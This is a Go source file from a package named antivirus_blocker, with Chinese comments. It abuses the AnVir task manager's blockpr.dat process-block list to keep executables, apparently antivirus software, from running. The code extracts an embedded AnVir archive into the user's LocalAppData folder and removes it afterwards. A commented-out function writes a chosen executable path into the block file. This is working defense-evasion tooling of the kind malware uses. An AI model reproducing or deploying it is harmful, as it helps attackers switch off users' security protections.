package antivirus_blocker

import (
	"fmt"
	"os"
	"path/filepath"
)

// 通过实验观察，如果不存在，反杀毒exe启动会在appdata/local目录下创建AnVir目录
// 目录下的blockpr.dat记录了需要block的exe全路径
// 所以我们构造好全路径，写入此文件，然后启动exe
// block的功能就生效了
func saveLocalAppData() error {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return fmt.Errorf("local app data is nil")
	}
	err := saveWinAnvirZip(anvirZip)
	if err != nil {
		return err
	}
	defer os.Remove(anvirZip)
	_, err = unzip(anvirZip, localAppData)
	return err
}

//清理
func removeLocalAppData() error {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return fmt.Errorf("local app data is nil")
	}
	os.RemoveAll(filepath.Join(localAppData, "AnVir"))
	return nil
}

/*
func ReplacePath(srcDir string, dst string, path string) error {
	if !common.PathExist(srcDir) {
		return fmt.Errorf("file not exist %s", srcDir)
	}
	header := filepath.Join(srcDir, "blockpr.dat.header")
	item := filepath.Join(srcDir, "blockpr.dat.item")
	tail := filepath.Join(srcDir, "blockpr.dat.tail")
	headerContent, err := ioutil.ReadFile(header)
	if err != nil {
		return err
	}
	tailContent, err := ioutil.ReadFile(tail)
	if err != nil {
		return err
	}
	itemContent, err := ioutil.ReadFile(item)
	if err != nil {
		return err
	}
	newBytes := make([]byte, 0)
	newBytes = append(newBytes, headerContent...)
	oneLine := bytes.Replace(itemContent, []byte("__ID__"), []byte(fmt.Sprintf("%d", 1)), -1)
	oneLine = bytes.Replace(oneLine, []byte("__PATH__"), []byte(strings.ToLower(path)), -1)

	newBytes = append(newBytes, oneLine...)
	newBytes = append(newBytes, tailContent...)
	err = ioutil.WriteFile(dst, newBytes, 0777)
	return err
}
*/
